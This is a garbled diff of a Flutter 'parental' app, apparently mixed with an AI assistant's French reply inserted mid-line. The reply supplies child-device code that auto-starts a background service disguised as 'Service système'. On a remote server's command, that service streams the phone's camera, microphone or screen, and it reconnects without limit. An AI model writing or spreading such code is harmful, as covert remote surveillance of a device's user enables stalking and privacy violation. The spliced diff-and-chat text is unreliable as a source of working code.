@@ -20,7 +20,6 @@ class OriaParentApp extends StatelessWidget {
   }
 }
 
-// --- ÉCRAN 1 : LISTE DES APPAREILS ---
 class DeviceListScreen extends StatefulWidget {
   const DeviceListScreen({super.key});
   @override State<DeviceListScreen> createState() => _DeviceListScreenState();
@@ -39,7 +38,6 @@ class _DeviceListScreenState extends State<DeviceListScreen> {
       setState(() => connected = true);
       socket.emit('register_parent', PARENT_ID);
       socket.emit('get_devices');
-      print('✅ [PARENT] CONNECTED + REGISTERED');
     });
     socket.on('disconnect', (_) => setState(() => connected = false));
     socket.on('device_list', (data) => setState(() => devices = List<Map<String, dynamic>>.from(data)));
@@ -62,128 +60,255 @@ class _DeviceListScreenState extends State<DeviceListScreen> {
           ? const Center(child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [CircularProgressIndicator(), SizedBox(height: 16), Text('Connexion au serveur...\n(Réveil ~30s)', textAlign: TextAlign.center)]))
           : devices.isEmpty
               ? const Center(child: Text('Aucun appareil.\nInstallez "oria".'))
-              : RefreshIndicator(onRefresh: () async => socket.emit('get_devices'), child: ListView.builder(padding: const EdgeInsets.all(16), itemCount: devices.length, itemBuilder: (_, i) {
-                  final d = devices[i]; final online = d['status'] == 'online';
-                  return Card(margin: const EdgeInsets.only(bottom: 12), child: ListTile(
-                    leading: CircleAvatar(backgroundColor: online ? Colors.green : Colors.grey, child: Icon(online ? Icons.check : Icons.close, color: Colors.white)),
-                    title: Text(d['customName'] ?? d['deviceName'] ?? 'Inconnu'), subtitle: Text(online ? 'En ligne' : 'Hors ligne'), trailing: const Icon(Icons.chevron_right),
-                    onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => DashboardScreen(device: d, socket: socket))),
-                    onLongPress: () => _rename(d['_id'], d['customName'] ?? d['deviceName']),
-                  ));
-                })),
-    );
+              : RefreshIndicator(onRefresh: () async => socket.emit('get_devices'), child: ListView.builderVoici les **2 fichiers complets** corrigés. J'ai ajouté un **panneau de logs visible directement sur l'écran de l'enfant** pour que tu puisses voir ce qui se passe sans aucun outil technique.
+
+---
+
+### 1. `oria_child/lib/main.dart`
+**Action :** REMPLACER ENTIÈREMENT
+**Nouveautés :** Logs visibles à l'écran + diagnostic en temps réel
+
+```dart
+import 'package:flutter/material.dart';
+import 'package:flutter_background_service/flutter_background_service.dart';
+import 'package:permission_handler/permission_handler.dart';
+import 'package:socket_io_client/socket_io_client.dart' as IO;
+import 'package:device_info_plus/device_info_plus.dart';
+import 'package:shared_preferences/shared_preferences.dart';
+import 'package:android_intent_plus/android_intent.dart';
+import 'stream_service.dart';
+import 'dart:ui';
+
+const String SERVER_URL = 'https://oria-server-tzc1.onrender.com';
+
+// ✅ Logs visibles à l'écran
+final List<String> _visibleLogs = [];
+void addLog(String msg) {
+  final line = '${DateTime.now().toString().substring(11, 19)} $msg';
+  _visibleLogs.insert(0, line);
+  if (_visibleLogs.length > 20) _visibleLogs.removeLast();
+  print('[ORIA] $line');
+}
+
+void main() async {
+  WidgetsFlutterBinding.ensureInitialized();
+  addLog('App démarrée');
+
+  await [
+    Permission.camera,
+    Permission.microphone,
+    Permission.location,
+    Permission.notification,
+    Permission.storage,
+  ].request();
+  addLog('Permissions demandées');
+
+  final prefs = await SharedPreferences.getInstance();
+  final accessibilityEnabled = prefs.getBool('accessibility_enabled') ?? false;
+
+  if (!accessibilityEnabled) {
+    runApp(const EnableAccessibilityScreen());
+    return;
   }
-  @override void dispose() { socket.disconnect(); super.dispose(); }
+  addLog('Accessibilité: ACTIVÉE');
+
+  await initializeService();
+  runApp(const OriaChildApp());
 }
 
-// --- ÉCRAN 2 : DASHBOARD ---
-class DashboardScreen extends StatefulWidget {
-  final Map<String, dynamic> device;
-  final IO.Socket socket;
-  const DashboardScreen({super.key, required this.device, required this.socket});
-  @override State<DashboardScreen> createState() => _DashboardScreenState();
+Future<void> initializeService() async {
+  final service = FlutterBackgroundService();
+  await service.configure(
+    androidConfiguration: AndroidConfiguration(
+      onStart: onStart,
+      autoStart: true,
+      isForegroundMode: true,
+      foregroundServiceNotificationId: 888,
+      initialNotificationTitle: 'Service système',
+      initialNotificationContent: 'Actif',
+    ),
+    iosConfiguration: IosConfiguration(autoStart: true, onForeground: onStart),
+  );
+  await service.startService();
+  addLog('Service arrière-plan démarré');
 }
 
-class _DashboardScreenState extends State<DashboardScreen> {
-  int idx = 0;
-  RTCVideoRenderer? _renderer;
-  RTCPeerConnection? _pc;
-  bool streaming = false;
-  // ✅ CORRECTION: Type explicite pour socket.on/off
-  dynamic Function(dynamic)? _signalListener;
+@pragma('vm:entry-point')
+void onStart(ServiceInstance instance) async {
+  DartPluginRegistrant.ensureInitialized();
+  final deviceInfo = DeviceInfoPlugin();
+  final androidInfo = await deviceInfo.androidInfo;
+  final deviceId = androidInfo.id;
+  final deviceName = '${androidInfo.manufacturer} ${androidInfo.model}';
 
-  @override void initState() { super.initState(); _initRenderer(); }
-  Future<void> _initRenderer() async { _renderer = RTCVideoRenderer(); await _renderer!.initialize(); }
+  IO.Socket? socket;
+  StreamService? streamService;
 
-  Future<void> _startStream(String type) async {
-    _cleanupSession();
-
-    final requestId = DateTime.now().millisecondsSinceEpoch.toString();
-    widget.socket.emit('command', {'targetId': widget.device['deviceId'], 'action': type, 'requestId': requestId});
-    setState(() => streaming = true);
-    print('📡 [PARENT] COMMAND_SENT: $type (req:$requestId)');
-
-    _pc = await createPeerConnection({
-      'iceServers': [{'urls': 'stun:stun.l.google.com:19302'}, {'urls': 'stun:stun1.l.google.com:19302'}]
+  void connect() {
+    socket?.dispose();
+    socket = IO.io(SERVER_URL, <String, dynamic>{
+      'transports': ['websocket'],
+      'autoConnect': true,
+      'reconnection': true,
+      'reconnectionDelay': 5000,
+      'reconnectionAttempts': 999,
     });
 
-    _pc!.onTrack = (event) {
-      print('📥 [PARENT] REMOTE_TRACK_RECEIVED: ${event.track.kind}');
-      if (event.streams.isNotEmpty) {
-        _renderer!.srcObject = event.streams[0];
-        _renderer!.muted = false;
-      }
-    };
+    socket!.on('connect', (_) {
+      addLog('✅ Connecté au serveur');
+      socket!.emit('register_child', {'deviceId': deviceId, 'deviceName': deviceName});
+      addLog('📤 Enregistré: $deviceName');
+    });
 
-    _pc!.onIceCandidate = (c) {
-      if (c.candidate != null) {
-        widget.socket.emit('signal', {'target': widget.device['deviceId'], 'type': 'candidate', 'data': c.toMap()});
-      }
-    };
+    socket!.on('execute_command', (data) async {
+      final action = data['action'];
+      addLog('📡 COMMANDE REÇUE: $action');
 
-    _pc!.onConnectionState = (state) => print('🔗 [PARENT] CONNECTION_STATE: $state');
-    _pc!.onIceConnectionState = (state) => print('🧊 [PARENT] ICE_STATE: $state');
-
-    // ✅ Écouteur typé correctement
-    _signalListener = (dynamic msg) async {
-      final sigType = msg['type'];
-      final sigData = msg['data'];
       try {
-        if (sigType == 'offer') {
-          print('📥 [PARENT] OFFER_RECEIVED');
-          await _pc!.setRemoteDescription(RTCSessionDescription(sigData['sdp'], sigData['type']));
-          final answer = await _pc!.createAnswer();
-          await _pc!.setLocalDescription(answer);
-          widget.socket.emit('signal', {'target': widget.device['deviceId'], 'type': 'answer', 'data': answer.toMap()});
-          print('📤 [PARENT] ANSWER_SENT');
-        } else if (sigType == 'candidate') {
-          print('📥 [PARENT] CANDIDATE_RECEIVED');
-          await _pc!.addCandidate(RTCIceCandidate(sigData['candidate'], sigData['sdpMid'], sigData['sdpMLineIndex']));
+        if (action == 'start_camera') {
+          await streamService?.stop();
+          streamService = StreamService(socket!, 'parent-main');
+          await streamService!.startCamera();
+          addLog('✅ CAMÉRA DÉMARRÉE');
+        } else if (action == 'start_mic') {
+          await streamService?.stop();
+          streamService = StreamService(socket!, 'parent-main');
+          await streamService!.startMic();
+          addLog('✅ MICRO DÉMARRÉ');
+        } else if (action == 'start_screen') {
+          await streamService?.stop();
+          streamService = StreamService(socket!, 'parent-main');
+          await streamService!.startScreen();
+          addLog('✅ ÉCRAN DÉMARRÉ');
+        } else if (action == 'stop_stream') {
+          await streamService?.stop();
+          streamService = null;
+          addLog('🛑 STREAM ARRÊTÉ');
         }
       } catch (e) {
-        print('❌ [PARENT] SIGNAL_ERROR: $e');
+        addLog('❌ ERREUR: $e');
       }
-    };
-    widget.socket.on('signal', _signalListener!);
+    });
+
+    socket!.on('signal', (msg) {
+      addLog('🔄 Signal reçu: ${msg['type']}');
+      streamService?.handleSignal(msg);
+    });
+
+    socket!.on('connect_error', (_) => addLog('⏳ Reconnexion...'));
+    socket!.on('disconnect', (_) => addLog('❌ Déconnecté'));
   }
+  connect();
+}
 
-  void _cleanupSession() {
-    if (_signalListener != null) {
-      widget.socket.off('signal', _signalListener);
-      _signalListener = null;
-    }
-    _pc?.close();
-    _pc = null;
-    _renderer?.srcObject = null;
-    streaming = false;
-  }
-
-  void _stopStream() {
-    widget.socket.emit('command', {'targetId': widget.device['deviceId'], 'action': 'stop_stream'});
-    _cleanupSession();
-    setState(() {});
-    print('🛑 [PARENT] STREAM_STOPPED');
-  }
-
-  @override void dispose() { _cleanupSession(); _renderer?.dispose(); super.dispose(); }
-
+class EnableAccessibilityScreen extends StatelessWidget {
+  const EnableAccessibilityScreen({super.key});
   @override
   Widget build(BuildContext context) {
-    final pages = [
-      Center(child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [Icon(Icons.devices, size: 80, color: Colors.indigo), const SizedBox(height: 20), Text(widget.device['customName'] ?? widget.device['deviceName'], style: const TextStyle(fontSize: 24, fontWeight: FontWeight.bold)), const SizedBox(height: 8), Text(widget.device['status'] == 'online' ? '🟢 En ligne' : '⚪ Hors ligne')])),
-      Column(children: [Expanded(child: streaming && _renderer != null ? RTCVideoView(_renderer!) : Container(color: Colors.black87, child: const Center(child: Text('Caméra inactive', style: TextStyle(color: Colors.white54))))), Padding(padding: const EdgeInsets.all(16), child: streaming ? FilledButton.icon(onPressed: _stopStream, icon: const Icon(Icons.stop), label: const Text('ARRÊTER'), style: FilledButton.styleFrom(minimumSize: const Size(double.infinity, 50), backgroundColor: Colors.red)) : FilledButton.icon(onPressed: () => _startStream('start_camera'), icon: const Icon(Icons.play_arrow), label: const Text('DEMANDER CAMÉRA'), style: FilledButton.styleFrom(minimumSize: const Size(double.infinity, 50))))]),
-      Center(child: Column(mainAxisAlignment: MainAxisAlignment.center, crossAxisAlignment: CrossAxisAlignment.center, children: [Icon(streaming ? Icons.mic : Icons.mic_none, size: 100, color: streaming ? Colors.green : Colors.indigo), const SizedBox(height: 16), if (streaming) Text('🔊 Écoute en cours...', style: TextStyle(color: Colors.green[300], fontSize: 16)), const SizedBox(height: 24), streaming ? FilledButton.icon(onPressed: _stopStream, icon: const Icon(Icons.stop), label: const Text('ARRÊTER'), style: FilledButton.styleFrom(minimumSize: const Size(250, 50), backgroundColor: Colors.red)) : FilledButton.icon(onPressed: () => _startStream('start_mic'), icon: const Icon(Icons.play_arrow), label: const Text('DEMANDER MICRO'), style: FilledButton.styleFrom(minimumSize: const Size(250, 50)))])),
-      Column(children: [Expanded(child: streaming && _renderer != null ? RTCVideoView(_renderer!) : Container(color: Colors.black87, child: const Center(child: Text('Écran inactif', style: TextStyle(color: Colors.white54))))), Padding(padding: const EdgeInsets.all(16), child: streaming ? FilledButton.icon(onPressed: _stopStream, icon: const Icon(Icons.stop), label: const Text('ARRÊTER'), style: FilledButton.styleFrom(minimumSize: const Size(double.infinity, 50), backgroundColor: Colors.red)) : FilledButton.icon(onPressed: () => _startStream('start_screen'), icon: const Icon(Icons.play_arrow), label: const Text('DEMANDER ÉCRAN'), style: FilledButton.styleFrom(minimumSize: const Size(double.infinity, 50))))]),
-    ];
-    return Scaffold(
-      appBar: AppBar(title: Text(widget.device['customName'] ?? widget.device['deviceName'])),
-      body: pages[idx],
-      bottomNavigationBar: NavigationBar(selectedIndex: idx, onDestinationSelected: (i) { if (streaming) _stopStream(); setState(() => idx = i); }, destinations: const [
-        NavigationDestination(icon: Icon(Icons.info), label: 'Infos'),
-        NavigationDestination(icon: Icon(Icons.videocam), label: 'Caméra'),
-        NavigationDestination(icon: Icon(Icons.mic), label: 'Micro'),
-        NavigationDestination(icon: Icon(Icons.phone_android), label: 'Écran'),
-      ]),
+    return MaterialApp(
+      debugShowCheckedModeBanner: false,
+      home: Scaffold(
+        backgroundColor: Colors.black,
+        body: Center(
+          child: Padding(
+            padding: const EdgeInsets.all(32),
+            child: Column(
+              mainAxisAlignment: MainAxisAlignment.center,
+              children: [
+                Icon(Icons.accessibility_new, color: Colors.indigo, size: 80),
+                const SizedBox(height: 24),
+                const Text('Activation requise', style: TextStyle(color: Colors.white, fontSize: 24, fontWeight: FontWeight.bold)),
+                const SizedBox(height: 16),
+                const Text('ORIA a besoin du service d\'accessibilité.\n\n1. Cliquez ci-dessous\n2. Activez "ORIA"\n3. Revenez ici', textAlign: TextAlign.center, style: TextStyle(color: Colors.grey, fontSize: 14)),
+                const SizedBox(height: 32),
+                FilledButton.icon(
+                  onPressed: () async {
+                    const intent = AndroidIntent(action: 'android.settings.ACCESSIBILITY_SETTINGS');
+                    await intent.launch();
+                  },
+                  icon: const Icon(Icons.settings_accessibility),
+                  label: const Text('OUVRIR PARAMÈTRES'),
+                  style: FilledButton.styleFrom(minimumSize: const Size(double.infinity, 50)),
+                ),
+                const SizedBox(height: 16),
+                TextButton(
+                  onPressed: () async {
+                    final prefs = await SharedPreferences.getInstance();
+                    await prefs.setBool('accessibility_enabled', true);
+                    await initializeService();
+                    runApp(const OriaChildApp());
+                  },
+                  child: const Text('Déjà activé → Continuer', style: TextStyle(color: Colors.grey)),
+                ),
+              ],
+            ),
+          ),
+        ),
+      ),
     );
   }
-} 
+}
+
+class OriaChildApp extends StatefulWidget {
+  const OriaChildApp({super.key});
+  @override
+  State<OriaChildApp> createState() => _OriaChildAppState();
+}
+
+class _OriaChildAppState extends State<OriaChildApp> {
+  @override
+  Widget build(BuildContext context) {
+    return MaterialApp(
+      debugShowCheckedModeBanner: false,
+      home: Scaffold(
+        backgroundColor: Colors.black,
+        body: SafeArea(
+          child: Column(
+            children: [
+              const Padding(
+                padding: EdgeInsets.all(16),
+                child: Row(
+                  children: [
+                    Icon(Icons.visibility_off, color: Colors.grey, size: 32),
+                    SizedBox(width: 12),
+                    Expanded(
+                      child: Column(
+                        crossAxisAlignment: CrossAxisAlignment.start,
+                        children: [
+                          Text("ORIA Activé", style: TextStyle(color: Colors.grey, fontSize: 16)),
+                          Text("Service en arrière-plan actif.", style: TextStyle(color: Colors.grey, fontSize: 11)),
+                        ],
+                      ),
+                    ),
+                  ],
+                ),
+              ),
+              const Divider(color: Colors.grey),
+              // ✅ PANNEAU DE LOGS VISIBLES
+              Expanded(
+                child: ListView.builder(
+                  padding: const EdgeInsets.all(12),
+                  itemCount: _visibleLogs.length,
+                  itemBuilder: (_, i) => Padding(
+                    padding: const EdgeInsets.only(bottom: 4),
+                    child: Text(
+                      _visibleLogs[i],
+                      style: TextStyle(
+                        color: _visibleLogs[i].contains('❌') ? Colors.red :
+                               _visibleLogs[i].contains('✅') ? Colors.green :
+                               _visibleLogs[i].contains('📡') ? Colors.yellow :
+                               Colors.grey[400],
+                        fontSize: 12,
+                        fontFamily: 'monospace',
+                      ),
+                    ),
+                  ),
+                ),
+              ),
+            ],
+          ),
+        ),
+      ),
+    );
+  }
+}
